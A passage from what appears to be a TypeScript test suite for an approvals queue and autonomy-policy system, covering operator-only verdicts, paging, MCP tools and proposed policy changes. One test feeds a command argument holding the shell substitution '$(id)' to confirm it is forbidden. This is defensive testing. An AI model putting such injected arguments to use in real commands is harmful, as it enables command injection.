    const forbidden = git.ctx.artifacts.get((await git.ctx.approvals.check({ class: 'command', command: ['git', '$(id)'] })).decision)!.body as { candidates: Array<{ option: string; reasons: string[] }>; outcome: { detail: Record<string, unknown> } }
    expect(forbidden.candidates.find((c) => c.option === 'forbid')!.reasons).toEqual(['argv word 2 holds a shell metacharacter: forbidden whatever a rule says'])
    expect(forbidden.outcome.detail).toMatchObject({ actionClass: 'command', forbidden: 'argv word 2 holds a shell metacharacter' })
    expect(await failureOf(ctx.approvals.check({ class: 'teleport' as Action['class'] }))).toBe('invalid')
    expect(await failureOf(ctx.approvals.check({ class: 'command', command: 'pnpm test' as unknown as string[] }))).toBe('invalid')
  })

  it('reports a verdict that fails on its own as failed, logged, and still applies the others (M3)', async () => {
    const { ctx } = await boot()
    const first = await asked(ctx, { class: 'merge' }, 'first')
    const second = await asked(ctx, { class: 'merge' }, 'second')
    const warnings = logged(ctx, 'warn')
    // An approval note beyond approval@1.0's bound fails the first verdict's write; nothing of it is kept.
    const results = await ctx.approvals.decide([
      { requestId: first.requestId, subject: first.subject, verdict: 'approved', note: 'x'.repeat(2001) },
      { requestId: second.requestId, subject: second.subject, verdict: 'approved' },
    ], after(1))
    expect(results.map((r) => [r.requestId, r.state, r.refused])).toEqual([[first.requestId, 'open', 'failed'], [second.requestId, 'approved', undefined]])
    expect(await ctx.approvals.get(first.requestId)).toEqual(first)
    expect(warnings).toContainEqual(`approvals: the verdict on ${first.requestId} was not applied, and nothing of it changed`)
    expect(ctx.artifacts.list({ kind: 'approval' })).toHaveLength(1)
  })

  it('refuses a malformed verdict before any verdict of the call applies', async () => {
    const { ctx } = await boot()
    const request = await asked(ctx, { class: 'merge' }, 'm')
    const call = ctx.approvals.decide([
      { requestId: request.requestId, subject: request.subject, verdict: 'approved' },
      { requestId: request.requestId, subject: request.subject, verdict: 'maybe' as 'approved' },
    ], after(1))
    expect(await failureOf(call)).toBe('invalid')
    expect(await ctx.approvals.get(request.requestId)).toEqual(request)
  })

  it('never acts on a stored request that fails its schema: reads refuse it, a call naming it decides nothing, and the sweep leaves it (INV-14)', async () => {
    const { ctx } = await boot()
    const broken = await asked(ctx, { class: 'merge' }, 'broken')
    const fine = await asked(ctx, { class: 'merge' }, 'fine')
    ctx.store.db.prepare('UPDATE approval_requests SET record = ? WHERE request_id = ?').run(JSON.stringify({ ...broken, state: 'approved' }), broken.requestId)
    await expect(ctx.approvals.get(broken.requestId)).rejects.toThrow(/is not a valid approval-request@1.0 and is not used/)
    await expect(ctx.approvals.list()).rejects.toThrow(/is not a valid approval-request@1.0/)
    await expect(ctx.approvals.decide([
      { requestId: fine.requestId, subject: fine.subject, verdict: 'approved' },
      { requestId: broken.requestId, subject: broken.subject, verdict: 'approved' },
    ], after(1))).rejects.toThrow(/is not a valid/)
    expect(JSON.parse((ctx.store.db.prepare('SELECT record FROM approval_requests WHERE request_id = ?').get(fine.requestId) as { record: string }).record)).toEqual(fine)
    const warnings = logged(ctx, 'warn')
    const swept = await ctx.approvals.sweep(after(86_400))
    expect(swept.map((r) => r.requestId)).toEqual([fine.requestId])
    expect(warnings).toContainEqual(expect.stringContaining(`left ${broken.requestId} as it was`))
    expect(await ctx.approvals.sweep(after(86_400))).toEqual([])
  })
})

describe('paging and the MCP tools', () => {
  type Reply = Awaited<ReturnType<ToolHandler>>
  const defOf = (name: ApprovalTool, part: 'input' | 'output'): string => `${name.replaceAll('_', '-')}-${part}`
  /** Call a tool as a scope would; every structured output is checked against its schema definition. */
  const call = async (booted: Booted, name: ApprovalTool, args: Record<string, unknown>, scope: 'client' | 'operator' = 'client'): Promise<Reply> => {
    const reply = await booted.mcp().tools.get(name)!.handler(args, { scope })
    if (!reply.isError) schemas.assertDef('mcp-approvals@1.0', defOf(name, 'output'), reply.structuredContent)
    return reply
  }
  const text = (reply: Reply): string => (reply.content[0] as { text: string }).text

  it('pages the queue: 20 by default, at most 100, in listing order, with a cursor it refuses when forged (INV-9)', async () => {
    const { ctx, approvals } = await boot()
    const made: ApprovalRequest[] = []
    for (let i = 0; i < 25; i++) made.push(await asked(ctx, { class: 'merge' }, `p${String(i).padStart(2, '0')}`, after(i)))
    const first = approvals.page()
    expect(first.requests).toHaveLength(20)
    const second = approvals.page({}, { after: first.next! })
    expect(second.next).toBeUndefined()
    expect([...first.requests, ...second.requests].map((r) => r.requestId)).toEqual(made.map((r) => r.requestId))
    expect(approvals.page({}, { limit: 100 }).requests).toHaveLength(25)
    for (const limit of [0, 101, 1.5]) expect(() => approvals.page({}, { limit })).toThrow(ApprovalsError)
    expect(() => approvals.page({}, { after: 'bm90LWEtY3Vyc29y' })).toThrow(/not a cursor this queue gave out/)
    // Batched requests come first, by batch, then the rest by expiry; paging keeps that order.
    await approvals.batch(after(30))
    const listed = (await approvals.list()).map((r) => r.requestId)
    expect(listed.slice(-1)).toEqual([made[24]!.requestId])
    const paged: string[] = []
    for (let cursor: string | undefined, n = 0; n === 0 || cursor; n++) {
      const page = approvals.page({}, { limit: 7, ...(cursor ? { after: cursor } : {}) })
      paged.push(...page.requests.map((r) => r.requestId))
      cursor = page.next
    }
    expect(paged).toEqual(listed)
    expect(approvals.page({ states: [] }).requests).toEqual([])
    expect(() => approvals.page({ states: ['pending' as 'open'] })).toThrow(/states must be a list/)
  })

  it('contributes approvals_list, approvals_get, and approvals_policy to clients, and approvals_decide and approvals_policy_propose to the operator only (INV-6)', async () => {
    const booted = await boot({ mcp: true })
    const tools = booted.mcp().tools
    expect([...tools.keys()].sort()).toEqual([...APPROVAL_TOOLS].sort())
    expect(Object.fromEntries([...tools].map(([name, t]) => [name, t.spec.scope]))).toEqual({ approvals_list: 'client', approvals_get: 'client', approvals_decide: 'operator', approvals_policy: 'client', approvals_policy_propose: 'operator' })
    // Each input shape takes what its schema definition takes.
    const samples: Record<ApprovalTool, Record<string, unknown>> = {
      approvals_list: { states: ['open', 'rejected'], projectId: 'p1', batchId: 'batch-1', limit: 100, after: 'x' },
      approvals_get: { requestId: 'apr-1' },
      approvals_decide: { verdicts: [{ requestId: 'apr-1', subject: subject('x'), verdict: 'rejected', note: 'no' }] },
      approvals_policy: { projectId: 'p1' },
      approvals_policy_propose: { policy: { ...STUDIO, version: 4 }, note: 'why' },
    }
    for (const name of APPROVAL_TOOLS) {
      expect(zod.object(INPUTS[name]).safeParse(samples[name]).success, name).toBe(true)
      schemas.assertDef('mcp-approvals@1.0', defOf(name, 'input'), samples[name])
    }
  })

  it('serves the queue through the tools, every output valid against its schema definition, and a refusal changes nothing', async () => {
    const booted = await boot({ mcp: true })
    const { ctx } = booted
    const policy = await call(booted, 'approvals_policy', { projectId: 'p1' })
    expect((policy.structuredContent as { policies: AutonomyPolicy[] }).policies.map((p) => p.id)).toEqual(['studio', 'p1.policy'])
    expect((await call(booted, 'approvals_policy', {})).structuredContent).toMatchObject({ policies: [{ id: 'studio' }] })

    // Made now: the tools decide at the time of the call.
    const merge = await asked(ctx, { class: 'merge' }, 'merge', new Date())
    const deploy = await asked(ctx, { class: 'deploy', projectId: 'p1' }, 'deploy', new Date())
    // Neither is batched: by expiry, p1's (its policy's 1800 s default) before the merge (3600 s).
    const listed = await call(booted, 'approvals_list', {})
    expect((listed.structuredContent as { requests: ApprovalRequest[] }).requests.map((r) => r.requestId)).toEqual([deploy.requestId, merge.requestId])
    expect((await call(booted, 'approvals_list', { projectId: 'p1', limit: 1 })).structuredContent).toEqual({ requests: [deploy] })
    expect((await call(booted, 'approvals_get', { requestId: merge.requestId })).structuredContent).toEqual({ request: merge })
    const unknown = await call(booted, 'approvals_get', { requestId: 'apr-unknown' })
    expect([unknown.isError, text(unknown)]).toEqual([true, 'unknown-request: no approval request apr-unknown'])

    // A client never gives a verdict, even if the tool reached it.
    const verdicts = [
      { requestId: merge.requestId, subject: merge.subject, verdict: 'approved', note: 'ship it' },
      { requestId: deploy.requestId, subject: subject('deploy', 'v2'), verdict: 'approved' },
      { requestId: 'apr-unknown', subject: subject('x'), verdict: 'rejected' },
    ]
    const byClient = await call(booted, 'approvals_decide', { verdicts }, 'client')
    expect([byClient.isError, text(byClient)]).toEqual([true, 'invalid: verdicts come only from the operator'])
    expect(await ctx.approvals.get(merge.requestId)).toEqual(merge)
    // An input its schema refuses does nothing.
    for (const args of [{ verdicts: [] }, { verdicts: [{ ...verdicts[0], verdict: 'maybe' }] }, { verdicts, extra: 1 }]) {
      const refused = await call(booted, 'approvals_decide', args, 'operator')
      expect(refused.isError).toBe(true)
      expect(text(refused)).toMatch(/^invalid input, nothing done: mcp-approvals@1\.2#\/\$defs\/approvals-decide-input/)
    }
    expect(await ctx.approvals.get(merge.requestId)).toEqual(merge)

    const decided = await call(booted, 'approvals_decide', { verdicts }, 'operator')
    const results = (decided.structuredContent as { results: VerdictResult[] }).results
    expect(results.map((r) => [r.requestId, r.state, r.refused])).toEqual([
      [merge.requestId, 'approved', undefined], [deploy.requestId, 'open', 'subject-changed'], ['apr-unknown', 'rejected', 'unknown-request'],
    ])
    expect(ctx.artifacts.get(results[0]!.approval!)).toMatchObject({ kind: 'approval', body: { subject: merge.subject, verdict: 'approved', by: 'operator', note: 'ship it' } })
    expect(await ctx.approvals.get(deploy.requestId)).toEqual(deploy)
    const resolved = await call(booted, 'approvals_list', { states: ['approved', 'rejected'] })
    expect((resolved.structuredContent as { requests: ApprovalRequest[] }).requests.map((r) => [r.requestId, r.state])).toEqual([[merge.requestId, 'approved']])
    expect((await call(booted, 'approvals_list', { after: 'forged' })).isError).toBe(true)
  })
})

describe('a policy change through the queue (docs/design/approvals.md#a-policy-change)', () => {
  const NO_MERGE: AutonomyPolicy = { ...STUDIO, version: 4, rules: STUDIO.rules.map((r) => (r.actionClass === 'merge' ? { ...r, mode: 'forbid' } : r)) }
  /** Propose `policy` and approve its request, as the operator would; the change applied. */
  const applied = async (booted: Booted, policy: AutonomyPolicy, at: Date = T0): Promise<PolicyChange> => {
    const { change, request } = await booted.approvals.proposePolicy({ policy }, at)
    const [result] = await booted.ctx.approvals.decide([{ requestId: request.requestId, subject: request.subject, verdict: 'approved' }], after(5, at))
    expect(result).toMatchObject({ state: 'approved' })
    return (await booted.approvals.policyChanges()).find((c) => c.changeId === change.changeId)!
  }
  const refusal = async (dir: string, config: Partial<Config>): Promise<string> => {
    const ctx = new Context()
    const store = ctx.plugin(Store, { path: join(dir, 'system.db') })
    const artifacts = ctx.plugin(Artifacts, {})
    await Promise.all([store, artifacts])
    onTestFinished(async () => { await artifacts.dispose(); await store.dispose() })
    const fiber = ctx.plugin(ManualApprovals, { policies: POLICIES, ...config })
    const error = await Promise.resolve(fiber).then(() => undefined, (e: unknown) => e)
    expect(ctx.get('approvals'), 'no ctx.approvals is provided').toBeUndefined()
    await fiber.dispose()
    return String((error as Error | undefined)?.message)
  }

  it('keeps the applied set across a restart while the configuration it derives from is unchanged (INV-4)', async () => {
    const first = await boot()
    const change = await applied(first, NO_MERGE)
    expect(change).toMatchObject({ state: 'applied', configHash: change.baseHash })
    await first.stop()
    const second = await boot({ dir: first.dir })
    const policy = await second.ctx.approvals.policy()
    expect(policy.policies[0]).toEqual(NO_MERGE)
    expect(policy.set).toEqual({ hash: change.hash, source: 'store', configHash: change.configHash, changeId: change.changeId, projects: ['p1', 'p3'] })
    expect((await second.ctx.approvals.check({ class: 'merge' })).mode).toBe('forbid')
    // A further change builds on the stored set, from the same configuration.
    const next = await applied(second, { ...PROJECT, version: 2, rules: [...PROJECT.rules, { actionClass: 'spend', mode: 'forbid' }] }, after(60))
    expect(next).toMatchObject({ baseHash: change.hash, configHash: change.configHash })
    expect((await second.ctx.approvals.policy()).set?.changeId).toBe(next.changeId)
  })

  it('proposes a research role\'s web access grant as a policy change that takes effect only on approval, and says what it lets run unasked (T262, ADR-0074)', async () => {
    const booted = await boot()
    const granted: AutonomyPolicy = {
      ...STUDIO, schema: 'autonomy-policy@1.3', version: 4,
      webAccess: { version: 1, rules: [{ profile: 'research', tools: ['WebSearch', 'WebFetch'], maxWebCallsPerRun: 40, maxClassification: 'operator-shared', note: 'literature reviews' }] },
    }
    const { change, request } = await booted.approvals.proposePolicy({ policy: granted }, T0)
    // Proposed, not applied: the set in force holds no grant until the operator approves.
    expect(change.state).toBe('asked')
    expect((await booted.ctx.approvals.policy()).policies[0]!.webAccess).toBeUndefined()
    expect(request.action.consequences).toContain('Web access (external-send still asks; these web calls run unasked once the egress check passes)')
    expect(request.action.consequences).toContain('research: WebSearch, WebFetch unasked when the egress check passes, at most 40 per run, content up to operator-shared')
    const [result] = await booted.ctx.approvals.decide([{ requestId: request.requestId, subject: request.subject, verdict: 'approved' }], after(5))
    expect(result).toMatchObject({ state: 'approved' })
    expect((await booted.ctx.approvals.policy()).policies[0]!.webAccess).toEqual(granted.webAccess)
    // No effective mode moves: external-send is still ask.
    expect((await booted.ctx.approvals.check({ class: 'external-send' })).mode).toBe('ask')
  })

  it('refuses the plugin when the configuration changed since the stored set was derived from it, and takes the configuration only when it supersedes that exact set (INV-2, INV-13)', async () => {
    const first = await boot()
    const change = await applied(first, NO_MERGE)
    await first.stop()
    const edited = [STUDIO, { ...PROJECT, version: 2, default: 'forbid' as const }, NO_COMMANDS]
    // Neither set is used, nor silently picked: the error names both hashes and the way out.
    const message = await refusal(first.dir, { policies: edited })
    expect(message).toContain(`the autonomy policy set in the store (${change.hash}, policy change ${change.changeId}) is not used`)
    expect(message).toContain(`it was derived from the configured set ${change.configHash}`)
    expect(message).toContain(`set supersedes: '${change.hash}'`)
    // A supersedes that names another set changes nothing.
    expect(await refusal(first.dir, { policies: edited, supersedes: `sha256:${'0'.repeat(64)}` })).toContain('is not used')
    // The configuration that names the stored set takes over, recorded.
    const second = await boot({ dir: first.dir, config: { policies: edited, supersedes: change.hash } })
    const policy = await second.ctx.approvals.policy('p1')
    expect(policy.set).toMatchObject({ source: 'configuration' })
    expect(policy.set!.hash).toBe(policy.set!.configHash)
    expect(policy.policies.map((p) => p.version)).toEqual([3, 2])
    const [retired] = await second.approvals.policyChanges({ states: ['retired'] })
    expect(retired).toMatchObject({ changeId: change.changeId, state: 'retired' })
    const decision = second.ctx.artifacts.get(retired!.retired!.decision)!.body
    expect(decision).toMatchObject({ schema: 'decision@1.6', decisionType: 'policy-change', decider: { type: 'rule', id: 'approvals.configuration' }, outcome: { option: policy.set!.hash, detail: { cause: 'configuration', from: change.hash, to: policy.set!.hash } } })
    await second.stop()
    // Once retired, the edited configuration loads with or without supersedes, and the original configuration no longer brings the change back.
    await (await boot({ dir: first.dir, config: { policies: edited } })).stop()
    const third = await boot({ dir: first.dir })
    expect((await third.ctx.approvals.policy()).policies[0]!.version).toBe(3)
  })

  it('agrees with a configuration that is the stored set itself, and with the original one', async () => {
    const first = await boot()
    const change = await applied(first, NO_MERGE)
    await first.stop()
    // The operator copied the applied set into the configuration, in another order.
    const copied = await boot({ dir: first.dir, config: { policies: [...change.policies].reverse() } })
    expect((await copied.ctx.approvals.policy()).set).toMatchObject({ hash: change.hash, source: 'store' })
    await copied.stop()
    const original = await boot({ dir: first.dir })
    expect((await original.ctx.approvals.policy()).set).toMatchObject({ hash: change.hash, source: 'store' })
  })

  it('never uses a stored change that fails its schema (INV-14)', async () => {
    const first = await boot()
    const change = await applied(first, NO_MERGE)
    first.ctx.store.db.prepare('UPDATE policy_changes SET record = ? WHERE change_id = ?').run(JSON.stringify({ ...change, policies: [] }), change.changeId)
    await first.stop()
    expect(await refusal(first.dir, {})).toMatch(/the stored policy change .* is not a valid policy-change@1\.x and is not used/)
  })

  it('refuses a proposal when the policy forbids policy changes, recording the autonomy decision, and queues nothing (INV-2)', async () => {
    const locked: AutonomyPolicy = { ...NO_COMMANDS, rules: [...NO_COMMANDS.rules, { actionClass: 'policy-change', mode: 'forbid' }] }
    const { ctx, approvals } = await boot({ config: { policies: [STUDIO, PROJECT, locked] } })
    await expect(approvals.proposePolicy({ policy: { ...locked, version: 2, default: 'forbid' } }, T0)).rejects.toThrow(/^policy-change: the policy says forbid/)
    expect(await failureOf(approvals.proposePolicy({ policy: { ...locked, version: 2, default: 'forbid' } }, T0))).toBe('not-asked')
    // The studio's own policy still changes through the queue.
    expect((await approvals.proposePolicy({ policy: NO_MERGE }, T0)).request.action.class).toBe('policy-change')
    expect((await ctx.approvals.list()).map((r) => r.requester.component)).toEqual(['approvals'])
  })

  it('serves approvals_policy_propose to the operator only, its output valid, and approvals_policy names the set in force (INV-6)', async () => {
    const booted = await boot({ mcp: true })
    const tool = booted.mcp().tools.get('approvals_policy_propose')!
    const byClient = await tool.handler({ policy: NO_MERGE }, { scope: 'client' })
    expect([byClient.isError, (byClient.content[0] as { text: string }).text]).toEqual([true, 'invalid: policy changes come only from the operator'])
    expect(await booted.approvals.policyChanges()).toEqual([])
    const reply = await tool.handler({ policy: NO_MERGE, note: 'no merges' }, { scope: 'operator' })
    expect(reply.isError).toBeFalsy()
    schemas.assertDef('mcp-approvals@1.2', 'approvals-policy-propose-output', reply.structuredContent)
    expect(reply.structuredContent).toMatchObject({ change: { state: 'asked', note: 'no merges' }, request: { action: { class: 'policy-change' } } })
    const refused = await tool.handler({ policy: { ...NO_MERGE, version: 3 } }, { scope: 'operator' })
    expect(refused.isError).toBe(true)
    const policy = await booted.mcp().tools.get('approvals_policy')!.handler({}, { scope: 'client' })
    schemas.assertDef('mcp-approvals@1.2', 'approvals-policy-output', policy.structuredContent)
    expect((policy.structuredContent as { set: { source: string } }).set.source).toBe('configuration')
  })

  it('checks the output of approvals_decide and approvals_policy_propose before anything commits: one its schema refuses (a defect) decides and stores nothing (INV-2, INV-14)', async () => {
    const booted = await boot({ mcp: true })
    const { ctx } = booted
    const merge = await asked(ctx, { class: 'merge' }, 'merge', new Date())
    const { change, request } = await booted.approvals.proposePolicy({ policy: NO_MERGE }, new Date())
    // A defect: the output of every tool that changes the queue is one its schema refuses.
    const assertDef = SchemaRegistry.prototype.assertDef
    const spy = vi.spyOn(SchemaRegistry.prototype, 'assertDef').mockImplementation(function (this: SchemaRegistry, tag, def, value) {
      if (tag.startsWith('mcp-approvals@') && (def === 'approvals-decide-output' || def === 'approvals-policy-propose-output')) throw new SchemaError(`${tag}#/$defs/${def}`, [], 'a defect')
      assertDef.call(this, tag, def, value)
    })
    onTestFinished(() => spy.mockRestore())
    const requests = await ctx.approvals.list({ states: ['open', 'batched', 'approved', 'rejected'] })
    const changes = await booted.approvals.policyChanges()
    // The merge approved and the policy change approved together: neither verdict applies, so no set changes.
    const verdicts = [{ requestId: merge.requestId, subject: merge.subject, verdict: 'approved' }, { requestId: request.requestId, subject: request.subject, verdict: 'approved' }]
    for (const [name, args] of [['approvals_decide', { verdicts }], ['approvals_policy_propose', { policy: { ...NO_MERGE, version: 5 } }]] as const) {
      const reply = await booted.mcp().tools.get(name)!.handler(args, { scope: 'operator' })
      expect([reply.isError, (reply.content[0] as { text: string }).text], name).toEqual([true, expect.stringMatching(new RegExp(`^approvals: ${name} would make an output its schema refuses \\(a defect\\), so nothing changed`))])
    }
    expect(await ctx.approvals.list({ states: ['open', 'batched', 'approved', 'rejected'] })).toEqual(requests)
    expect(await booted.approvals.policyChanges()).toEqual(changes)
    expect((await ctx.approvals.policy()).set).toMatchObject({ source: 'configuration' })
    // Once the output checks, the same verdicts apply.
    spy.mockRestore()
    const reply = await booted.mcp().tools.get('approvals_decide')!.handler({ verdicts }, { scope: 'operator' })
    expect((reply.structuredContent as { results: VerdictResult[] }).results.map((r) => r.state)).toEqual(['approved', 'approved'])
    expect((await booted.approvals.policyChanges()).find((c) => c.changeId === change.changeId)).toMatchObject({ state: 'applied' })
  })
})

describe('the queue proposes a policy change from repeated approvals (docs/design/approvals.md#the-queue-proposes-a-policy-change)', () => {
  const REPEATED = { repeatedApprovals: { enabled: true, approvals: 3, windowSeconds: 3600 } }
  const LINT = ['pnpm', 'lint']
  /** A Worker's command call asked of the queue at `at`, as the agents source's gate asks it (studio policy, the argv judged again). */
  const command = async (ctx: Context, argv: string[], ref: string, at: Date, extra: Partial<NewRequest> = {}): Promise<ApprovalRequest> => {
    const verdict = await ctx.approvals.check({ class: 'command', command: argv })
    expect(verdict.mode).toBe('ask')
    return ctx.approvals.request({
      subject: subject(`agent-tool-call:run-${ref}:Bash`), action: { class: 'command', summary: `Bash: ${argv.join(' ')}` },
      requester: { component: 'worker', runId: `run-${ref}`, sessionId: `session-${ref}` }, verdict, command: argv, classification: 'operator-shared', ...extra,
    }, at)
  }
  const verdict = async (ctx: Context, request: ApprovalRequest, value: 'approved' | 'rejected', at: Date): Promise<VerdictResult> =>
    (await ctx.approvals.decide([{ requestId: request.requestId, subject: request.subject, verdict: value }], at))[0]!
  /** `times` requests for the argv, each approved by the operator 5 s after it was asked, a minute apart from `from`. */
  const approvedTimes = async (ctx: Context, argv: string[], times: number, from: Date = T0, tag = 'a'): Promise<ApprovalRequest[]> => {
    const made: ApprovalRequest[] = []
    for (let i = 0; i < times; i++) {
      const request = await command(ctx, argv, `${tag}${i}`, after(60 * i, from))
      expect(await verdict(ctx, request, 'approved', after(60 * i + 5, from))).toMatchObject({ state: 'approved' })
      made.push(request)
    }
    return made
  }
  const decisionBody = (ctx: Context, ref: string) => ctx.artifacts.get(ref as `sha256:${string}`)!.body as { schema: string; inputs: string[]; decider: Record<string, unknown>; outcome: { option: string; detail: Record<string, unknown> }; candidates: Array<{ option: string; selected: boolean }> }

  it('is off unless enabled: no approvals, however many, make a proposal', async () => {
    for (const config of [{}, { repeatedApprovals: { approvals: 3 } }]) {
      const { ctx, approvals } = await boot({ config })
      await approvedTimes(ctx, LINT, 6)
      expect(await approvals.proposeRepeated(after(600))).toBeUndefined()
      expect(await approvals.policyChanges()).toEqual([])
    }
  })

  it('proposes, once the threshold is reached, exactly the repeated argv as one studio commands line, recorded as a decision, and never applies it (INV-6, INV-13)', async () => {
    const booted = await boot({ config: REPEATED })
    const { ctx, approvals } = booted
    const counted = await approvedTimes(ctx, LINT, 2)
    expect(await approvals.proposeRepeated(after(300))).toBeUndefined()
    counted.push(...await approvedTimes(ctx, LINT, 1, after(200), 'b'))
    const change = (await approvals.proposeRepeated(after(300)))!
    schemas.assertRecord(change)
    expect(change).toMatchObject({
      schema: 'policy-change@1.1', state: 'asked', effect: [], previous: STUDIO,
      origin: { rule: 'approvals.repeated-approvals', shape: { actionClass: 'command', command: 'pnpm lint' }, approved: 3, windowSeconds: 3600 },
    })
    // Exactly one line added to the studio's commands list, at the next version; nothing else moves.
    expect(change.policy).toEqual({ ...STUDIO, version: 4, commands: ['pnpm test', 'pnpm lint'] })
    expect(change.note).toBeUndefined()
    const request = (await ctx.approvals.get(change.requestId))!
    expect(request).toMatchObject({ schema: 'approval-request@1.1', state: 'open', action: { class: 'policy-change' }, requester: { component: 'approvals', policyChangeId: change.changeId } })
    expect(request.action.summary).toBe('The queue proposes: list the command `pnpm lint` in studio (version 3 to 4)')
    expect(request.action.consequences).toContain('Proposed by the queue, not by you: you approved this exact command 3 times among the requests of the last 1 hour')
    expect(request.action.consequences).toContain('judged as workspace-write (auto, its checks tests, lint pending until the result is accepted)')
    const decision = decisionBody(ctx, change.origin!.decision)
    schemas.assertRecord(decision as unknown as { schema: string })
    expect(decision).toMatchObject({
      schema: 'decision@1.6', decisionType: 'policy-change', decider: { type: 'rule', id: 'approvals.repeated-approvals', hash: change.hash },
      outcome: { option: change.hash, detail: { cause: 'repeated-approvals', changeId: change.changeId, requestId: change.requestId, from: change.baseHash, to: change.hash, approved: 3, threshold: 3, requests: counted.map((r) => r.requestId) } },
    })
    expect(decision.candidates.map((c) => [c.option, c.selected])).toEqual([[change.hash, true], [change.baseHash, false]])
    const approvalsCounted = await Promise.all(counted.map(async (r) => (await ctx.approvals.get(r.requestId))!.resolution!.approval))
    expect([...decision.inputs].sort()).toEqual([request.policy.decision, ...approvalsCounted].sort())
    // Proposed, not applied: the argv still asks.
    expect((await ctx.approvals.check({ class: 'command', command: LINT })).mode).toBe('ask')
    // At most one open proposal: further passes, also after a restart, propose nothing more.
    await approvedTimes(ctx, ['pnpm', 'build'], 3, after(400), 'c')
    expect(await approvals.proposeRepeated(after(700))).toBeUndefined()
    await booted.stop()
    const again = await boot({ dir: booted.dir, config: REPEATED })
    expect(await again.approvals.proposeRepeated(after(700))).toBeUndefined()
    expect((await again.approvals.policyChanges()).map((c) => c.changeId)).toEqual([change.changeId])
    // The operator's approval applies it: the exact argv now runs as workspace-write, a longer one still asks.
    expect(await verdict(again.ctx, request, 'approved', after(800))).toMatchObject({ state: 'approved' })
    expect(await again.ctx.approvals.check({ class: 'command', command: LINT })).toMatchObject({ mode: 'auto', failedChecks: ['tests', 'lint'] })
    expect((await again.ctx.approvals.check({ class: 'command', command: [...LINT, '--fix'] })).mode).toBe('ask')
    // Applied: never proposed again; the next shape is proposed on the new set.
    const next = (await again.approvals.proposeRepeated(after(900)))!
    expect(next).toMatchObject({ baseHash: change.hash, origin: { shape: { command: 'pnpm build' } }, policy: { version: 5, commands: ['pnpm test', 'pnpm lint', 'pnpm build'] } })
  })

  it('never proposes again for a command whose proposal the operator rejected or let expire', async () => {
    const { ctx, approvals } = await boot({ config: REPEATED })
    await approvedTimes(ctx, LINT, 3)
    const rejected = (await approvals.proposeRepeated(after(200)))!
    expect(await verdict(ctx, (await ctx.approvals.get(rejected.requestId))!, 'rejected', after(210))).toMatchObject({ state: 'rejected' })
    expect((await approvals.policyChanges())[0]).toMatchObject({ state: 'declined', declined: { cause: 'rejected' } })
    await approvedTimes(ctx, LINT, 3, after(300), 'b')
    expect(await approvals.proposeRepeated(after(600))).toBeUndefined()
    // Another command is proposed, and left unanswered until it expires (the studio's default, an hour).
    await approvedTimes(ctx, ['pnpm', 'build'], 3, after(600), 'c')
    const expiring = (await approvals.proposeRepeated(after(800)))!
    expect(expiring.origin?.shape.command).toBe('pnpm build')
    await ctx.approvals.sweep(after(800 + 3600))
    expect((await approvals.policyChanges())[0]).toMatchObject({ changeId: expiring.changeId, state: 'declined', declined: { cause: 'expired' } })
    await approvedTimes(ctx, ['pnpm', 'build'], 3, after(4500), 'd')
    expect(await approvals.proposeRepeated(after(4700))).toBeUndefined()
  })

  it('reads the shape\'s requests again in the transaction that stores the proposal: one rejected while it was proposed stops it', async () => {
    const { ctx, approvals } = await boot({ config: REPEATED })
    await approvedTimes(ctx, LINT, 3)
    // Open, it counts neither way; the operator rejects it while the queue checks that a change asks.
    const pending = await command(ctx, LINT, 'p', after(200))
    const check = approvals.check.bind(approvals)
    approvals.check = async (action: Action) => {
      if (action.class === 'policy-change') expect(await verdict(ctx, pending, 'rejected', after(250))).toMatchObject({ state: 'rejected' })
      return check(action)
    }
    expect(await approvals.proposeRepeated(after(300))).toBeUndefined()
    expect(await approvals.policyChanges()).toEqual([])
    approvals.check = check
    // Read again on the next pass, the rejection keeps the shape out.
    expect(await approvals.proposeRepeated(after(310))).toBeUndefined()
  })

  it('proposes again on the new set when its proposal was withdrawn because another change came into force', async () => {
    const { ctx, approvals } = await boot({ config: REPEATED })
    await approvedTimes(ctx, LINT, 3)
    // The operator's own proposal is open: the queue waits.
    const own = await approvals.proposePolicy({ policy: { ...PROJECT, version: 2, default: 'forbid' } }, after(190))
    expect(await approvals.proposeRepeated(after(200))).toBeUndefined()
    await verdict(ctx, own.request, 'rejected', after(205))
    const first = (await approvals.proposeRepeated(after(210)))!
    // Another change comes into force first (the operator proposes and approves it through the queue elsewhere).
    const other = await approvals.proposePolicy({ policy: { ...PROJECT, version: 2, default: 'forbid' } }, after(220))
    expect(await approvals.proposeRepeated(after(225))).toBeUndefined()
    expect(await verdict(ctx, other.request, 'approved', after(230))).toMatchObject({ state: 'approved' })
    expect((await approvals.policyChanges({ states: ['declined'] })).find((c) => c.changeId === first.changeId)).toMatchObject({ declined: { cause: 'withdrawn' } })
    const second = (await approvals.proposeRepeated(after(240)))!
    expect(second).toMatchObject({ baseHash: other.change.hash, origin: { shape: { command: 'pnpm lint' } } })
    expect(second.changeId).not.toBe(first.changeId)
  })

  it('counts only the requests made in the window, never with a rejected or expired one there; withdrawn and open ones count neither way', async () => {
    const { ctx, approvals } = await boot({ config: REPEATED })
    const refused = await command(ctx, LINT, 'r', T0)
    await verdict(ctx, refused, 'rejected', after(5))
    await approvedTimes(ctx, LINT, 3, after(60))
    expect(await approvals.proposeRepeated(after(300))).toBeUndefined()
    // An hour after the rejection's request was made it falls out of the window; the approvals in it still count.
    expect(await approvals.proposeRepeated(after(3600))).toMatchObject({ origin: { approved: 3 } })
    // Expired: another command, its window holds an unanswered request that expired (600 s).
    const second = await boot({ config: REPEATED })
    await command(second.ctx, LINT, 'x', T0)
    await second.ctx.approvals.sweep(after(600))
    await approvedTimes(second.ctx, LINT, 3, after(700))
    expect(await second.approvals.proposeRepeated(after(1000))).toBeUndefined()
    // Withdrawn and still open requests do not stop it.
    const third = await boot({ config: REPEATED })
    await third.ctx.approvals.withdraw((await command(third.ctx, LINT, 'w', T0)).requestId, after(5))
    await command(third.ctx, LINT, 'o', after(10))
    await approvedTimes(third.ctx, LINT, 2, after(20))
    expect(await third.approvals.proposeRepeated(after(300))).toBeUndefined()
    await approvedTimes(third.ctx, LINT, 1, after(400), 'b')
    expect(await third.approvals.proposeRepeated(after(500))).toMatchObject({ origin: { approved: 3 } })
  })

  it('never proposes for anything but a studio command\'s exact argv: not a project\'s, a local-private one, another class, a class that always asks, or where listing would not lower what is asked', async () => {
    const { ctx, approvals } = await boot({ config: REPEATED })
    for (let i = 0; i < 3; i++) {
      for (const [action, ref] of [[{ class: 'merge' }, 'merge'], [{ class: 'deploy' }, 'deploy'], [{ class: 'command', command: LINT, projectId: 'p1' }, 'p1']] as Array<[Action, string]>) {
